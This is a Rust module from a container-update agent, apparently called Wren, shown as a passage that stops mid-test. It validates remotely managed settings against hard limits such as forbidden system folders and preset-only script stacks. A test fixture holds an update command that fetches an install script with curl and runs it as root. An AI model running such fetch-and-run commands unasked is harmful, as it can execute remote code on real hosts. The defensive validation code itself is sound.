//! Settings managed in Wren's web UI (docs/agent.md, "Managed settings").
//!
//! An admin edits a server's agent settings in Wren; Wren sends them in the
//! heartbeat's answer as data (never a command line); the agent checks them
//! against hard limits of its own, keeps them in `managed.json` beside
//! `agent.toml` and applies them without a restart. The agent reports back
//! which settings version it runs, or why it refused one.
//!
//! What can be managed: `[updates]` (allow, deny, `min_health_seconds`,
//! `require_snapshot`), `roots`, `[retention]` and script stacks made from
//! the presets compiled into the agent ([`crate::presets`]). What can't:
//! `server`, `token`, `docker_socket`, `scan_interval` and script stacks
//! with commands of their own, which only `agent.toml` can define.
//!
//! The hard limits, which refuse the whole update when one is broken: a
//! root must be an absolute folder under a folder mounted into the agent
//! (bind mounts of its own container, at the same path on the host), not
//! `/`, not under system folders ([`forbidden`]) and not the agent's config
//! folder; script stacks only by preset, with a folder under a root and a
//! name and Compose project that [`crate::config`] would take; numbers
//! within the bounds `agent.toml` has. A root that `agent.toml` itself
//! lists stays valid: the host's owner chose it locally.
//!
//! `WW_AGENT_LOCKED=1` turns all of this off: the agent ignores managed
//! settings (and a `managed.json` it finds) and uses `agent.toml` alone.

use std::collections::HashSet;
use std::io::Write as _;
use std::path::{Component, Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::config::{
    COMPOSE_MANAGER, Config, MAX_RETENTION, Retention, ScriptStack, UpdatePolicy, absolute,
    valid_glob, valid_name,
};
use crate::presets;

/// Beside `agent.toml`.
pub const FILE: &str = "managed.json";
/// The environment variable that locks the agent to `agent.toml`.
pub const LOCK_ENV: &str = "WW_AGENT_LOCKED";
/// Most entries in each list.
pub const MAX_ROOTS: usize = 50;
pub const MAX_GLOBS: usize = 200;
pub const MAX_STACKS: usize = 10;
/// Shortest and longest time between two updates of a script stack.
pub const MIN_INTERVAL_SECONDS: i64 = 60;
pub const MAX_INTERVAL_SECONDS: i64 = 24 * 60 * 60;
/// Longest error told to Wren.
const MAX_ERROR: usize = 600;

/// Settings as Wren sends them and the agent keeps them.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Settings {
    /// Counts up with every change Wren makes; the agent never goes back.
    pub version: i64,
    pub updates: Updates,
    pub roots: Vec<String>,
    pub retention: Keep,
    #[serde(default)]
    pub script_stacks: Vec<Stack>,
}

#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Updates {
    /// Globs on target names; empty allows nothing.
    pub allow: Vec<String>,
    pub deny: Vec<String>,
    pub min_health_seconds: i64,
    pub require_snapshot: bool,
}

/// `[retention]`.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Keep {
    pub rollback_images: i64,
    /// `None`: what Wren asks for.
    pub snapshots: Option<i64>,
}

/// A script stack made from a preset: everything else is the preset's.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Stack {
    pub preset: String,
    pub name: String,
    pub compose_project: String,
    pub working_dir: String,
    pub min_interval_seconds: i64,
}

impl Settings {
    /// Settings from JSON (Wren's answer, or `managed.json`).
    pub fn parse(value: &Value) -> Result<Settings, String> {
        Settings::deserialize(value).map_err(|e| {
            format!(
                "the settings aren't understood by this agent ({}); update the agent",
                clip(&e.to_string(), 200)
            )
        })
    }
}

fn clip(s: &str, max: usize) -> String {
    s.chars().filter(|c| !c.is_control()).take(max).collect()
}

/// Folders a root may never be in or under: system folders, the container
/// runtime's, `/boot` (but for Unraid's Compose Manager projects, which the
/// docs ask for). `None`: allowed.
pub fn forbidden(path: &Path) -> Option<&'static str> {
    if path.starts_with(COMPOSE_MANAGER) {
        return None;
    }
    const DIRS: [&str; 12] = [
        "/boot",
        "/etc",
        "/proc",
        "/sys",
        "/dev",
        "/var/lib/docker",
        "/var/run",
        "/run",
        "/usr",
        "/bin",
        "/sbin",
        "/root",
    ];
    if let Some(d) = DIRS.iter().find(|d| path.starts_with(d)) {
        return Some(d);
    }
    match path.components().nth(1) {
        Some(Component::Normal(first)) if first.to_string_lossy().starts_with("lib") => {
            Some("/lib*")
        }
        _ => None,
    }
}

/// Whether `child` is `parent` or in it (whole components).
fn within(child: &Path, parent: &Path) -> bool {
    child.starts_with(parent)
}

/// The preset stacks of `agent.toml` as settings, and the names of the
/// stacks that stay custom.
fn split_stacks(base: &Config) -> (Vec<Stack>, Vec<String>) {
    let (mut presets_, mut custom) = (Vec::new(), Vec::new());
    for s in &base.script_stacks {
        match presets::identify(s) {
            Some(preset) => presets_.push(Stack {
                preset: preset.to_string(),
                name: s.name.clone(),
                compose_project: s.compose_project.clone(),
                working_dir: s.working_dir.to_string_lossy().to_string(),
                min_interval_seconds: i64::try_from(s.min_interval.as_secs()).unwrap_or(3600),
            }),
            None => custom.push(s.name.clone()),
        }
    }
    (presets_, custom)
}

/// What `agent.toml` says, as settings (version 0): the first-connect
/// report that lets Wren start with the same values. Never the token, never
/// the commands of custom stacks (their names go in the report beside it).
pub fn import_of(base: &Config) -> Settings {
    Settings {
        version: 0,
        updates: Updates {
            allow: base.updates.allow.clone().unwrap_or_default(),
            deny: base.updates.deny.clone(),
            min_health_seconds: i64::try_from(base.updates.min_health_seconds).unwrap_or(30),
            require_snapshot: base.updates.require_snapshot,
        },
        roots: base
            .roots
            .iter()
            .map(|r| r.to_string_lossy().to_string())
            .collect(),
        retention: Keep {
            rollback_images: i64::try_from(base.retention.rollback_images).unwrap_or(1),
            snapshots: base.retention.snapshots.and_then(|n| i64::try_from(n).ok()),
        },
        script_stacks: split_stacks(base).0,
    }
}

/// Checks `s` against the hard limits and makes the configuration it
/// describes: `base` (`agent.toml`) with its managed keys replaced.
/// `mounts` are the folders mounted into the agent; `None` for settings
/// kept from an earlier check (read back from `managed.json` at start,
/// when Docker may not answer yet). Every problem is listed.
pub fn apply(
    base: &Config,
    s: &Settings,
    mounts: Option<&[PathBuf]>,
) -> Result<Config, Vec<String>> {
    let mut problems = Vec::new();
    if s.version < 1 {
        problems.push(format!("version {} must be 1 or more", s.version));
    }

    // [updates]
    for (list, field) in [(&s.updates.allow, "allow"), (&s.updates.deny, "deny")] {
        if list.len() > MAX_GLOBS {
            problems.push(format!("updates.{field}: at most {MAX_GLOBS} entries"));
        }
        for (i, g) in list.iter().enumerate() {
            if !valid_glob(g) {
                problems.push(format!(
                    "updates.{field}[{i}] \"{}\": use a container or stack name, with * and ? as wildcards",
                    clip(g, 40)
                ));
            }
        }
    }
    let min_health = match u64::try_from(s.updates.min_health_seconds) {
        Ok(n) if n <= crate::jobs::MAX_HEALTH_SECONDS => n,
        _ => {
            problems.push(format!(
                "updates.min_health_seconds = {}: use a whole number from 0 to {}",
                s.updates.min_health_seconds,
                crate::jobs::MAX_HEALTH_SECONDS
            ));
            0
        }
    };

    // [retention]
    let count = |n: i64, field: &str, problems: &mut Vec<String>| -> usize {
        match usize::try_from(n) {
            Ok(n) if (1..=MAX_RETENTION).contains(&n) => n,
            _ => {
                problems.push(format!(
                    "retention.{field} = {n}: use a whole number from 1 to {MAX_RETENTION}"
                ));
                1
            }
        }
    };
    let rollback_images = count(
        s.retention.rollback_images,
        "rollback_images",
        &mut problems,
    );
    let snapshots = s
        .retention
        .snapshots
        .map(|n| count(n, "snapshots", &mut problems));

    // roots
    if s.roots.len() > MAX_ROOTS {
        problems.push(format!("roots: at most {MAX_ROOTS} folders"));
    }
    let config_dir = base.ledger.parent().map(Path::to_path_buf);
    let mut roots: Vec<PathBuf> = Vec::new();
    for (i, r) in s.roots.iter().enumerate() {
        let shown = clip(r, 100);
        let path = match absolute(r) {
            Ok(p) => p.components().collect::<PathBuf>(),
            Err(e) => {
                problems.push(format!("roots[{i}] \"{shown}\": {e}"));
                continue;
            }
        };
        if path == Path::new("/") {
            problems.push(format!(
                "roots[{i}] \"{shown}\": / is too broad; list the folders Wren may touch"
            ));
            continue;
        }
        // A root the host's own agent.toml lists was chosen on the host.
        if !base.roots.contains(&path) {
            if let Some(dir) = forbidden(&path) {
                problems.push(format!(
                    "roots[{i}] \"{shown}\": folders in {dir} can't be roots"
                ));
                continue;
            }
            if config_dir
                .as_deref()
                .is_some_and(|c| within(&path, c) || within(c, &path))
            {
                problems.push(format!(
                    "roots[{i}] \"{shown}\": that is the agent's own config folder"
                ));
                continue;
            }
            if let Some(mounts) = mounts
                && !mounts.iter().any(|m| within(&path, m))
            {
                problems.push(if mounts.is_empty() {
                    format!(
                        "roots[{i}] \"{shown}\": the agent can't tell which folders are mounted into it (it could not read its own container)"
                    )
                } else {
                    format!(
                        "roots[{i}] \"{shown}\": not in a folder mounted into the agent; mount it at the same path, or choose a mounted one"
                    )
                });
                continue;
            }
        }
        if !roots.contains(&path) {
            roots.push(path);
        }
    }

    // script stacks
    let (_, custom_names) = split_stacks(base);
    let custom: Vec<&ScriptStack> = base
        .script_stacks
        .iter()
        .filter(|s| custom_names.contains(&s.name))
        .collect();
    if s.script_stacks.len() > MAX_STACKS {
        problems.push(format!("script_stacks: at most {MAX_STACKS}"));
    }
    let mut names: HashSet<String> = custom.iter().map(|c| c.name.clone()).collect();
    let mut projects: HashSet<String> = custom.iter().map(|c| c.compose_project.clone()).collect();
    let mut stacks = Vec::new();
    for (i, st) in s.script_stacks.iter().enumerate() {
        let at = format!("script_stacks[{i}] ({})", clip(&st.name, 40));
        let before = problems.len();
        if !presets::NAMES.contains(&st.preset.as_str()) {
            problems.push(format!(
                "{at}: unknown preset \"{}\"; this agent knows {}",
                clip(&st.preset, 40),
                presets::NAMES.join(", ")
            ));
        }
        if !valid_name(&st.name) {
            problems.push(format!(
                "{at}: name may only use a-z, 0-9, - and _ (at most 64)"
            ));
        } else if !names.insert(st.name.clone()) {
            problems.push(format!("{at}: name is used twice"));
        }
        if !valid_name(&st.compose_project) {
            problems.push(format!(
                "{at}: compose_project may only use a-z, 0-9, - and _ (at most 64)"
            ));
        } else if !projects.insert(st.compose_project.clone()) {
            problems.push(format!("{at}: compose_project is used twice"));
        }
        let dir = match absolute(&st.working_dir) {
            Ok(p) => p.components().collect::<PathBuf>(),
            Err(e) => {
                problems.push(format!("{at}: working_dir {e}"));
                PathBuf::new()
            }
        };
        if !dir.as_os_str().is_empty() && !roots.iter().any(|r| within(&dir, r)) {
            problems.push(format!(
                "{at}: working_dir {} is not under any of roots",
                clip(&st.working_dir, 100)
            ));
        }
        if !(MIN_INTERVAL_SECONDS..=MAX_INTERVAL_SECONDS).contains(&st.min_interval_seconds) {
            problems.push(format!(
                "{at}: min_interval_seconds {} must be from {MIN_INTERVAL_SECONDS} to {MAX_INTERVAL_SECONDS}",
                st.min_interval_seconds
            ));
        }
        if problems.len() == before {
            let interval = Duration::from_secs(st.min_interval_seconds.unsigned_abs());
            if let Some(stack) =
                presets::render(&st.preset, &st.name, &st.compose_project, &dir, interval)
            {
                stacks.push(stack);
            }
        }
    }
    // Custom stacks keep working only where the roots still cover them.
    for c in &custom {
        if !roots.iter().any(|r| within(&c.working_dir, r)) {
            problems.push(format!(
                "custom script stack \"{}\" (agent.toml) works in {}, which is not under the roots; keep a root that covers it",
                c.name,
                c.working_dir.display()
            ));
        }
    }

    if !problems.is_empty() {
        return Err(problems);
    }
    let mut config = base.clone();
    config.roots = roots;
    config.updates = UpdatePolicy {
        allow: Some(s.updates.allow.clone()),
        deny: s.updates.deny.clone(),
        min_health_seconds: min_health,
        require_snapshot: s.updates.require_snapshot,
    };
    config.retention = Retention {
        rollback_images,
        snapshots,
    };
    config.script_stacks = custom.into_iter().cloned().chain(stacks).collect();
    Ok(config)
}

// ---------------------------------------------------------------------------
// The folders mounted into the agent
// ---------------------------------------------------------------------------

/// The bind mounts of the agent's container that are usable roots: folders
/// mounted at the same path as on the host (the same-path rule), as they
/// exist under `root` (`/` in the agent).
pub fn mounts_from_inspect(inspect: &Value, root: &Path) -> Vec<PathBuf> {
    let text = |m: &Value, k: &str| m.get(k).and_then(Value::as_str).unwrap_or("").to_string();
    let mut out: Vec<PathBuf> = inspect
        .get("Mounts")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter(|m| text(m, "Type") == "bind")
        .filter_map(|m| {
            let dest = text(m, "Destination");
            (dest == text(m, "Source")).then_some(dest)
        })
        .filter_map(|d| absolute(&d).ok())
        .map(|d| d.components().collect::<PathBuf>())
        .filter(|d| d != Path::new("/") && root.join(d.strip_prefix("/").unwrap_or(d)).is_dir())
        .collect();
    out.sort();
    out.dedup();
    out
}

/// This agent's own bind mounts ([`mounts_from_inspect`]); empty when
/// Docker can't say (the container isn't found).
pub async fn own_mounts(socket: &str, root: &Path) -> Vec<PathBuf> {
    let id = crate::jobs::own_id();
    if id.is_empty() {
        return Vec::new();
    }
    match crate::docker::get_json(socket, &format!("/containers/{id}/json")).await {
        Ok(inspect) => mounts_from_inspect(&inspect, root),
        Err(_) => Vec::new(),
    }
}

// ---------------------------------------------------------------------------
// The live configuration
// ---------------------------------------------------------------------------

/// What the heartbeat tells Wren about the settings.
#[derive(Debug, Clone, Default, PartialEq, Serialize)]
pub struct Report {
    /// This agent can take settings from Wren (older agents send no report).
    pub supported: bool,
    /// `WW_AGENT_LOCKED`: only `agent.toml` counts.
    pub locked: bool,
    /// The version in force; none before Wren sent any.
    pub version: Option<i64>,
    /// Why the last offered settings were refused ('' when they weren't).
    pub error: String,
    /// The version that was refused, when known.
    pub error_version: Option<i64>,
    /// Folders mounted into the agent: the roots Wren may offer.
    pub mounts: Vec<String>,
    /// The presets this agent knows.
    pub presets: Vec<String>,
    /// Script stacks with commands of their own in `agent.toml` (names only).
    pub custom_stacks: Vec<String>,
    /// The settings in force; while none were received, what `agent.toml`
    /// says (the first-connect import). Wren starts from it when it holds no
    /// settings of its own for this server. None when locked.
    pub current: Option<Settings>,
}

#[derive(Debug)]
struct State {
    effective: Arc<Config>,
    applied: Option<Settings>,
    error: Option<(Option<i64>, String)>,
}

/// The configuration in force: `agent.toml` with the managed settings on
/// top, swapped atomically when Wren sends new ones.
#[derive(Debug)]
pub struct Live {
    base: Config,
    path: PathBuf,
    locked: bool,
    state: Mutex<State>,
}

/// Whether `WW_AGENT_LOCKED` asks for the lock.
pub fn locked_by(env: impl Fn(&str) -> Option<String>) -> bool {
    env(LOCK_ENV).is_some_and(|v| {
        matches!(
            v.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        )
    })
}

/// What happened to an offer.
#[derive(Debug, PartialEq, Eq)]
pub enum Offered {
    Applied(i64),
    /// Already in force.
    Same(i64),
}

impl Live {
    /// `base` is the checked `agent.toml`. Unless `locked`, a `managed.json`
    /// beside it is read and applied (a damaged or now-invalid one is
    /// reported and `agent.toml` stays in force).
    pub fn new(base: Config, locked: bool) -> Live {
        let path = base
            .ledger
            .parent()
            .map_or_else(|| PathBuf::from("/config"), Path::to_path_buf)
            .join(FILE);
        let mut state = State {
            effective: Arc::new(base.clone()),
            applied: None,
            error: None,
        };
        if !locked {
            match std::fs::read_to_string(&path) {
                Ok(text) => {
                    let parsed = serde_json::from_str::<Value>(&text)
                        .map_err(|e| format!("{} isn't JSON ({e})", path.display()))
                        .and_then(|v| Settings::parse(&v));
                    match parsed {
                        Ok(s) => match apply(&base, &s, None) {
                            Ok(config) => {
                                state.effective = Arc::new(config);
                                state.applied = Some(s);
                            }
                            Err(p) => state.error = Some((Some(s.version), p.join("; "))),
                        },
                        Err(e) => state.error = Some((None, e)),
                    }
                }
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                Err(e) => {
                    state.error = Some((None, format!("can't read {}: {e}", path.display())));
                }
            }
        }
        Live {
            base,
            path,
            locked,
            state: Mutex::new(state),
        }
    }

    fn state(&self) -> std::sync::MutexGuard<'_, State> {
        self.state.lock().unwrap_or_else(|e| e.into_inner())
    }

    /// The configuration in force right now.
    pub fn config(&self) -> Arc<Config> {
        self.state().effective.clone()
    }

    pub fn locked(&self) -> bool {
        self.locked
    }

    /// The version in force.
    pub fn version(&self) -> Option<i64> {
        self.state().applied.as_ref().map(|s| s.version)
    }

    /// The last refusal, if there is one.
    pub fn error(&self) -> Option<String> {
        self.state().error.as_ref().map(|(_, e)| e.clone())
    }

    /// Checks settings Wren sent, keeps them in `managed.json` and swaps
    /// them in. On any problem nothing changes. Locked agents ignore Wren.
    pub fn offer(&self, value: &Value, mounts: &[PathBuf]) -> Result<Offered, String> {
        if self.locked {
            return Err(format!(
                "{LOCK_ENV} is set: this agent uses agent.toml only"
            ));
        }
        let version = value.get("version").and_then(Value::as_i64);
        let result = self.try_offer(value, mounts);
        let mut state = self.state();
        match &result {
            Ok(_) => state.error = None,
            Err(e) => state.error = Some((version, clip(e, MAX_ERROR))),
        }
        drop(state);
        result.map_err(|e| clip(&e, MAX_ERROR))
    }

    fn try_offer(&self, value: &Value, mounts: &[PathBuf]) -> Result<Offered, String> {
        let s = Settings::parse(value)?;
        let current = self.state().applied.clone();
        if let Some(cur) = &current {
            if s.version < cur.version {
                return Err(format!(
                    "version {} is older than version {} in force; the agent never goes back (is Wren's database a restored copy?)",
                    s.version, cur.version
                ));
            }
            if s.version == cur.version {
                return if *cur == s {
                    Ok(Offered::Same(s.version))
                } else {
                    Err(format!(
                        "version {} is already in force with other values",
                        s.version
                    ))
                };
            }
        }
        let config = apply(&self.base, &s, Some(mounts)).map_err(|p| p.join("; "))?;
        write_atomic(&self.path, &s)?;
        let mut state = self.state();
        state.effective = Arc::new(config);
        state.applied = Some(s.clone());
        Ok(Offered::Applied(s.version))
    }

    /// What the heartbeat reports.
    pub fn report(&self, mounts: &[PathBuf]) -> Report {
        let state = self.state();
        let (_, custom) = split_stacks(&self.base);
        let (error_version, error) = match &state.error {
            Some((v, e)) => (*v, e.clone()),
            None => (None, String::new()),
        };
        Report {
            supported: true,
            locked: self.locked,
            version: state.applied.as_ref().map(|s| s.version),
            error,
            error_version,
            mounts: mounts
                .iter()
                .map(|m| m.to_string_lossy().to_string())
                .collect(),
            presets: presets::NAMES.iter().map(|p| p.to_string()).collect(),
            custom_stacks: custom,
            current: (!self.locked).then(|| {
                state
                    .applied
                    .clone()
                    .unwrap_or_else(|| import_of(&self.base))
            }),
        }
    }

    /// One line for `--check`.
    pub fn describe(&self) -> String {
        let state = self.state();
        if self.locked {
            return format!("settings: locked ({LOCK_ENV} is set); agent.toml only");
        }
        match (&state.applied, &state.error) {
            (Some(s), None) => format!(
                "settings: version {} from Wren in force ({})",
                s.version,
                self.path.display()
            ),
            (_, Some((_, e))) => format!(
                "settings: {} can't be used, agent.toml is in force: {e}",
                self.path.display()
            ),
            (None, None) => "settings: none from Wren yet; agent.toml is in force".to_string(),
        }
    }
}

/// Writes the settings to a temporary file beside `path` and renames it over
/// the old one (mode 0600).
fn write_atomic(path: &Path, s: &Settings) -> Result<(), String> {
    let text = serde_json::to_string_pretty(s).map_err(|e| e.to_string())?;
    let tmp = path.with_extension("json.tmp");
    let write = || -> std::io::Result<()> {
        if let Some(dir) = path.parent() {
            std::fs::create_dir_all(dir)?;
        }
        let mut options = std::fs::OpenOptions::new();
        options.write(true).create(true).truncate(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt as _;
            options.mode(0o600);
        }
        let mut f = options.open(&tmp)?;
        f.write_all(text.as_bytes())?;
        f.sync_all()?;
        std::fs::rename(&tmp, path)
    };
    write().map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        format!("can't write {}: {e}", path.display())
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const TOKEN: &str = "wwa_0123456789abcdefghijABCDEFGHIJ0123456789xyz";

    fn no_env(_: &str) -> Option<String> {
        None
    }

    fn base_with(extra: &str) -> Config {
        let text = format!(
            "server = \"http://10.0.3.26:3003\"\ntoken = \"{TOKEN}\"\nroots = [\"/mnt/user/appdata\"]\n[updates]\nallow = [\"*\"]\n{extra}"
        );
        Config::from_parts(Some(&text), no_env).unwrap()
    }

    fn mounts() -> Vec<PathBuf> {
        vec![
            PathBuf::from("/mnt/user/appdata"),
            PathBuf::from("/mnt/cache/appdata"),
            PathBuf::from("/srv"),
            PathBuf::from("/boot/config"),
            PathBuf::from("/var/lib/docker"),
        ]
    }

    fn settings() -> Settings {
        Settings {
            version: 2,
            updates: Updates {
                allow: vec!["nextcloud".into(), "media-*".into()],
                deny: vec!["media-db*".into()],
                min_health_seconds: 60,
                require_snapshot: true,
            },
            roots: vec!["/mnt/cache/appdata".into(), "/srv/apps".into()],
            retention: Keep {
                rollback_images: 2,
                snapshots: Some(3),
            },
            script_stacks: vec![Stack {
                preset: "fluxer".into(),
                name: "fluxer".into(),
                compose_project: "fluxer".into(),
                working_dir: "/mnt/cache/appdata/fluxer".into(),
                min_interval_seconds: 7200,
            }],
        }
    }

    fn refused(s: &Settings, base: &Config) -> String {
        apply(base, s, Some(&mounts())).unwrap_err().join("\n")
    }

    #[test]
    fn valid_settings_make_the_configuration() {
        let base = base_with("");
        let c = apply(&base, &settings(), Some(&mounts())).unwrap();
        assert_eq!(
            c.roots,
            [
                PathBuf::from("/mnt/cache/appdata"),
                PathBuf::from("/srv/apps")
            ]
        );
        assert!(c.updates.allows("nextcloud") && c.updates.allows("media-x"));
        assert!(!c.updates.allows("media-db1") && !c.updates.allows("other"));
        assert_eq!(c.updates.min_health_seconds, 60);
        assert!(c.updates.require_snapshot);
        assert_eq!(
            (c.retention.rollback_images, c.retention.snapshots),
            (2, Some(3))
        );
        let s = &c.script_stacks[0];
        assert_eq!((s.name.as_str(), s.preset), ("fluxer", Some("fluxer")));
        assert_eq!(s.min_interval, Duration::from_secs(7200));
        assert_eq!(s.working_dir, PathBuf::from("/mnt/cache/appdata/fluxer"));
        // What agent.toml owns stays.
        assert_eq!(
            (c.server.as_str(), c.token.as_str()),
            (base.server.as_str(), TOKEN)
        );
    }

    /// A change to valid settings that breaks one hard limit.
    type Change = Box<dyn Fn(&mut Settings)>;

    #[test]
    fn every_hard_limit_refuses_the_whole_update() {
        let base = base_with("");
        let cases: Vec<(Change, &str)> = vec![
            (Box::new(|s| s.version = 0), "version 0 must be 1 or more"),
            (Box::new(|s| s.roots.push("/".into())), "/ is too broad"),
            (
                Box::new(|s| s.roots.push("relative".into())),
                "must be an absolute path",
            ),
            (
                Box::new(|s| s.roots.push("/srv/../etc".into())),
                "must not contain",
            ),
            (
                Box::new(|s| s.roots.push("/etc/wren".into())),
                "folders in /etc can't be roots",
            ),
            (
                Box::new(|s| s.roots.push("/boot/config/plugins/x".into())),
                "folders in /boot",
            ),
            (
                Box::new(|s| s.roots.push("/var/lib/docker/volumes".into())),
                "/var/lib/docker",
            ),
            (Box::new(|s| s.roots.push("/usr/local".into())), "/usr"),
            (Box::new(|s| s.roots.push("/proc/1".into())), "/proc"),
            (Box::new(|s| s.roots.push("/sys/fs".into())), "/sys"),
            (Box::new(|s| s.roots.push("/dev/shm".into())), "/dev"),
            (Box::new(|s| s.roots.push("/run/user".into())), "/run"),
            (Box::new(|s| s.roots.push("/var/run/x".into())), "/var/run"),
            (Box::new(|s| s.roots.push("/bin".into())), "/bin"),
            (Box::new(|s| s.roots.push("/sbin/x".into())), "/sbin"),
            (Box::new(|s| s.roots.push("/lib64/x".into())), "/lib*"),
            (Box::new(|s| s.roots.push("/root/.ssh".into())), "/root"),
            (
                Box::new(|s| s.roots.push("/config".into())),
                "agent's own config folder",
            ),
            (
                Box::new(|s| s.roots.push("/home/user".into())),
                "not in a folder mounted into the agent",
            ),
            (
                Box::new(|s| s.roots.push("/mnt".into())),
                "not in a folder mounted into the agent",
            ),
            (
                Box::new(|s| s.updates.allow.push("a b".into())),
                "updates.allow[2]",
            ),
            (
                Box::new(|s| s.updates.deny.push("".into())),
                "updates.deny[1]",
            ),
            (
                Box::new(|s| s.updates.min_health_seconds = 99999),
                "min_health_seconds = 99999",
            ),
            (
                Box::new(|s| s.updates.min_health_seconds = -1),
                "min_health_seconds = -1",
            ),
            (
                Box::new(|s| s.retention.rollback_images = 0),
                "retention.rollback_images = 0",
            ),
            (
                Box::new(|s| s.retention.snapshots = Some(11)),
                "retention.snapshots = 11",
            ),
            (
                Box::new(|s| s.script_stacks[0].preset = "shell".into()),
                "unknown preset \"shell\"",
            ),
            (
                Box::new(|s| s.script_stacks[0].name = "Fluxer 1".into()),
                "name may only use",
            ),
            (
                Box::new(|s| s.script_stacks[0].compose_project = "a/b".into()),
                "compose_project may only use",
            ),
            (
                Box::new(|s| s.script_stacks[0].working_dir = "/srv/apps/../x".into()),
                "working_dir must not contain",
            ),
            (
                Box::new(|s| s.script_stacks[0].working_dir = "/opt/fluxer".into()),
                "working_dir /opt/fluxer is not under any of roots",
            ),
            (
                Box::new(|s| s.script_stacks[0].min_interval_seconds = 5),
                "min_interval_seconds 5",
            ),
            (
                Box::new(|s| s.script_stacks[0].min_interval_seconds = 999_999),
                "min_interval_seconds 999999",
            ),
            (
                Box::new(|s| {
                    let again = s.script_stacks[0].clone();
                    s.script_stacks.push(again);
                }),
                "name is used twice",
            ),
        ];
        for (change, want) in cases {
            let mut s = settings();
            change(&mut s);
            let got = refused(&s, &base);
            assert!(got.contains(want), "want {want:?} in {got:?}");
        }
        // Nothing mounted at all: roots can't be vouched for.
        let err = apply(&base, &settings(), Some(&[])).unwrap_err().join("\n");
        assert!(
            err.contains("can't tell which folders are mounted"),
            "{err}"
        );
    }

    #[test]
    fn unraids_compose_manager_folder_is_the_one_boot_exception() {
        let base = base_with("");
        let mut s = settings();
        s.roots
            .push("/boot/config/plugins/compose.manager/projects".into());
        assert!(apply(&base, &s, Some(&mounts())).is_ok());
        assert!(forbidden(Path::new("/boot/config/plugins/compose.manager/projects/x")).is_none());
        assert!(forbidden(Path::new("/boot/config/plugins")).is_some());
        for ok in ["/mnt/user/x", "/opt/x", "/srv/x", "/home/x", "/var/lib/x"] {
            assert!(forbidden(Path::new(ok)).is_none(), "{ok}");
        }
    }

    #[test]
    fn roots_from_agent_toml_stay_valid_wherever_they_are() {
        // The host's owner chose these locally; Wren keeping them is no widening.
        let text = format!(
            "server = \"http://10.0.3.26:3003\"\ntoken = \"{TOKEN}\"\nroots = [\"/home/me/apps\", \"/boot/config/special\"]\n[updates]\nallow = [\"*\"]\n"
        );
        let base = Config::from_parts(Some(&text), no_env).unwrap();
        let mut s = settings();
        s.roots = vec!["/home/me/apps".into(), "/boot/config/special".into()];
        s.script_stacks.clear();
        assert!(apply(&base, &s, Some(&[])).is_ok());
    }

    #[test]
    fn script_stacks_only_by_preset_and_custom_ones_stay() {
        let custom = "\n[[script_stack]]\nname = \"mine\"\nworking_dir = \"/mnt/user/appdata/mine\"\ntimeout = \"1m\"\nupdate = { command = \"./update.sh\" }\n";
        let base = base_with(custom);
        let mut s = settings();
        // The custom stack's folder must stay under a root.
        let err = refused(&s, &base);
        assert!(err.contains("custom script stack \"mine\""), "{err}");
        s.roots.push("/mnt/user/appdata".into());
        let c = apply(&base, &s, Some(&mounts())).unwrap();
        let names: Vec<&str> = c.script_stacks.iter().map(|s| s.name.as_str()).collect();
        assert_eq!(names, ["mine", "fluxer"]);
        assert_eq!(c.script_stacks[0].update, "./update.sh");
        assert_eq!(c.script_stacks[0].preset, None);
        // A managed stack can't take a custom stack's name.
        s.script_stacks[0].name = "mine".into();
        assert!(refused(&s, &base).contains("name is used twice"));
    }

    #[test]
    fn the_first_report_imports_agent_toml_without_commands_or_token() {
        let fluxer = r#"
[[script_stack]]
name = "fluxer"
compose_project = "fluxer"
working_dir = "/mnt/user/appdata/fluxer"
handles_own_backup = true
env = { COMPOSE_PROJECT_NAME = "fluxer" }
timeout = "20m"
min_interval = "2h"
[script_stack.check]
command = "curl -fsSL -o /dev/null https://fluxer.dev/rexctl/release.json"
[script_stack.update]
command = """
curl -fsSLO https://fluxer.dev/install.sh && curl -fsSLO https://fluxer.dev/install.sh.sha256 \
  && sha256sum -c install.sh.sha256 \
  && sh install.sh --update --allow-root --non-interactive --dir "$PWD"
"""
[script_stack.rollback]
command = "sh install.sh --rollback --allow-root --non-interactive --dir \"$PWD\""

[[script_stack]]
name = "mine"
working_dir = "/mnt/user/appdata/mine"
timeout = "1m"
update = { command = "./secret-update.sh --key hunter2" }
"#;
        let base = base_with(&format!(
            "deny = [\"x\"]\nmin_health_seconds = 45\n{fluxer}"
        ));
        let live = Live::new(base.clone(), false);
        let report = live.report(&mounts());
        assert!(report.supported && !report.locked);
        assert_eq!(report.custom_stacks, ["mine"]);
        assert_eq!(report.presets, ["fluxer"]);
        let import = report.current.clone().unwrap();
        assert_eq!(import.version, 0);
        assert_eq!(import.updates.allow, ["*"]);
        assert_eq!(import.updates.deny, ["x"]);
        assert_eq!(import.updates.min_health_seconds, 45);
        assert_eq!(import.roots, ["/mnt/user/appdata"]);
        assert_eq!(
            import.script_stacks,
            [Stack {
                preset: "fluxer".into(),
                name: "fluxer".into(),
                compose_project: "fluxer".into(),
                working_dir: "/mnt/user/appdata/fluxer".into(),
                min_interval_seconds: 7200
            }]
        );
        let wire = serde_json::to_string(&report).unwrap();
        assert!(
            !wire.contains(TOKEN) && !wire.contains("hunter2") && !wire.contains("secret-update")
        );
        // Importing changes nothing: the same values, version 1, apply cleanly.
        let mut first = import;
        first.version = 1;
        let c = apply(&base, &first, Some(&[])).unwrap();
        assert_eq!(c.roots, base.roots);
        assert_eq!(c.updates, base.updates);
        assert_eq!(c.retention, base.retention);
        let names: Vec<&str> = c.script_stacks.iter().map(|s| s.name.as_str()).collect();
        assert_eq!(names, ["mine", "fluxer"]);
        let fluxer_now = c.script_stacks.iter().find(|s| s.name == "fluxer").unwrap();
